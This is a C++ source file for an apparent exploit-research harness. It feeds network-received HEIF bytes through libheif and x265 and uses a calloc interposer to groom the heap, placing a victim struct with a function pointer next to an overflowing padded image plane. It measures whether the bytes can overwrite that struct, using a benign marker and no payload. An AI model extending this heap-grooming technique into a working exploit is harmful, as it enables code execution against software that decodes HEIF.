// W172: loopback wire input + W171 live-victim interposer.
//
// Combines the two measured lanes: one HEIF byte stream is accepted on
// 127.0.0.1, decoded by the pinned public libheif decoder and re-encoded by a
// fixed-size x265 encoder; a calloc interposer places a live Victim adjacent
// to the padded plane at the exact padding reallocation. This measures whether
// WIRE-DERIVED bytes can overwrite a live object with a clean return. It is
// still a synthetic consumer and a harness-placed victim: rung 4, NOT rung 5.
//
// Usage: reencode_wire_interpose OUTPUT.heif [retain]
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <string>
#include <vector>

#include <libheif/heif.h>
#include <libheif/heif_sequences.h>

extern "C" void* __libc_malloc(size_t);
extern "C" void* __libc_calloc(size_t, size_t);
extern "C" void __libc_free(void*);

struct Victim {
  void (*fn)();
  unsigned char tag[32775];
};

static int g_count = 0;
static void* g_A = nullptr;
static Victim* g_B = nullptr;
static void benign_marker() { std::printf("BENIGN_MARKER_CALLED\n"); }

static void make_pair()
{
  g_A = __libc_malloc(32783);
  g_B = static_cast<Victim*>(__libc_malloc(sizeof(Victim)));
  for (size_t i = 0; i < sizeof(g_B->tag); ++i)
    g_B->tag[i] = static_cast<unsigned char>(0xa5 + (i & 0xff));
  g_B->fn = benign_marker;
}

extern "C" void* calloc(size_t n, size_t s)
{
  const size_t want = n * s;
  if (want == 32783) {
    ++g_count;
    if (g_count == 2 && g_A && g_B) {
      void* A = g_A;
      Victim* B = g_B;
      __libc_free(A);
      std::fprintf(stderr,
                   "GROOM count=%d A=%p B=%p delta=%ld fn=%p tag0=0x%02x\n",
                   g_count, A, static_cast<void*>(B),
                   static_cast<long>(static_cast<char*>(static_cast<void*>(B)) -
                                     static_cast<char*>(A)),
                   reinterpret_cast<void*>(B->fn), B->tag[0]);
      std::fflush(stderr);
    }
  }
  void* p = __libc_calloc(n, s);
  if (want == 32783)
    std::fprintf(stderr, "CALLOC32783 count=%d ret=%p%s\n", g_count, p,
                 p == g_A ? " == A" : "");
  return p;
}

static void report(const char* what, heif_error err)
{
  if (err.code)
    std::fprintf(stderr, "%s: rc=%d sub=%d %s\n", what, err.code, err.subcode,
                 err.message ? err.message : "(no message)");
}

static bool recv_all(int fd, std::vector<uint8_t>& out)
{
  uint8_t buf[65536];
  for (;;) {
    ssize_t n = recv(fd, buf, sizeof(buf), 0);
    if (n < 0) return false;
    if (n == 0) return true;
    out.insert(out.end(), buf, buf + n);
  }
}

int main(int argc, char** argv)
{
  if (argc < 2) {
    std::fprintf(stderr, "usage: %s OUTPUT.heif [retain]\n", argv[0]);
    return 64;
  }
  const bool retain_frame1 = argc > 2 && std::string(argv[2]) == "retain";
  make_pair();

  int srv = socket(AF_INET, SOCK_STREAM, 0);
  if (srv < 0) return 10;
  int one = 1;
  setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  sockaddr_in addr{};
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;
  if (bind(srv, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) return 11;
  socklen_t alen = sizeof(addr);
  if (getsockname(srv, reinterpret_cast<sockaddr*>(&addr), &alen) < 0) return 12;
  if (listen(srv, 1) < 0) return 13;
  std::printf("WIRE_PORT %u\n", ntohs(addr.sin_port));
  std::fflush(stdout);

  int conn = accept(srv, nullptr, nullptr);
  if (conn < 0) return 14;
  std::vector<uint8_t> wire;
  bool ok = recv_all(conn, wire);
  close(conn);
  close(srv);
  if (!ok) return 15;
  std::printf("WIRE_RECEIVED %zu bytes\n", wire.size());
  std::fflush(stdout);

  heif_context* in = heif_context_alloc();
  report("wire read", heif_context_read_from_memory(in, wire.data(), wire.size(), nullptr));
  if (!heif_context_has_sequence(in)) return 1;
  heif_track* in_track = heif_context_get_track(in, 0);
  uint16_t tw = 0, th = 0;
  report("track resolution", heif_track_get_image_resolution(in_track, &tw, &th));

  heif_context* out = heif_context_alloc();
  heif_track* out_track = nullptr;
  heif_encoder* encoder = nullptr;
  report("get x265 encoder", heif_context_get_encoder_for_format(out, heif_compression_HEVC, &encoder));
  if (!encoder) return 2;
  report("add track", heif_context_add_visual_sequence_track(
                          out, tw, th, heif_track_type_image_sequence,
                          nullptr, nullptr, &out_track));
  if (!out_track) return 3;

  heif_image* held = nullptr;
  for (int frame = 0;; ++frame) {
    heif_image* img = nullptr;
    heif_error err = heif_track_decode_next_image(in_track, &img,
                                                  heif_colorspace_YCbCr,
                                                  heif_chroma_420, nullptr);
    if (err.code == heif_error_End_of_sequence) break;
    if (err.code) { report("decode", err); return 4; }
    int stride = 0;
    heif_image_get_plane_readonly(img, heif_channel_Y, &stride);
    std::printf("WIRE_FRAME %d decoded %dx%d stride=%d\n", frame,
                heif_image_get_width(img, heif_channel_Y),
                heif_image_get_height(img, heif_channel_Y), stride);
    std::fflush(stdout);
    const heif_error enc_err = heif_track_encode_sequence_image(out_track, img, encoder, nullptr);
    report("encode", enc_err);
    std::printf("WIRE_ENCODE_RC %d\n", enc_err.code);
    std::fflush(stdout);
    if (frame == 1 && g_B) {
      std::printf("VICTIM fn=%p tag[0..7]=", reinterpret_cast<void*>(g_B->fn));
      for (int i = 0; i < 8; ++i) std::printf("%02x ", g_B->tag[i]);
      std::printf("\nB-8=");
      const unsigned long* hdr = reinterpret_cast<const unsigned long*>(
          static_cast<const unsigned char*>(static_cast<void*>(g_B)) - 8);
      std::printf("%#lx\n", hdr[0]);
      std::fflush(stdout);
    }
    if (retain_frame1 && frame == 1) held = img;
    else heif_image_release(img);
  }

  report("end sequence", heif_track_encode_end_of_sequence(out_track, encoder));
  report("write", heif_context_write_to_file(out, argv[1]));
  if (g_B) {
    std::printf("POST fn=%p\n", reinterpret_cast<void*>(g_B->fn));
    if (g_B->fn == benign_marker) g_B->fn();
  }
  std::fflush(stdout);
// W171 lifetime: the retained frame-1 image is deliberately never released;
// releasing it here frees the already-corrupted plane and aborts in malloc.
  heif_encoder_release(encoder);
  heif_track_release(out_track);
  heif_context_free(out);
  heif_track_release(in_track);
  heif_context_free(in);
  return 0;
}
